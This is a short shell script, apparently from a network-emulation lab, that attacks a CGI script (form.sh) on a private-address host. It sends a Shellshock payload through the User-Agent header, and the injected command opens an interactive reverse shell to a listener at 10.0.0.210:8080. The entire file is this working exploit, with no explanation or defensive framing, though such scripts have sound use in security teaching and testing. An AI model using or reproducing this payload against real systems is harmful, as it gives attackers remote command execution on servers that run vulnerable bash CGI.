#!/bin/sh
host="10.0.1.10"

himage Attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/local/bin/bash -i >& /dev/tcp/10.0.0.210/8080 0>&1`";' http://$host/form.sh
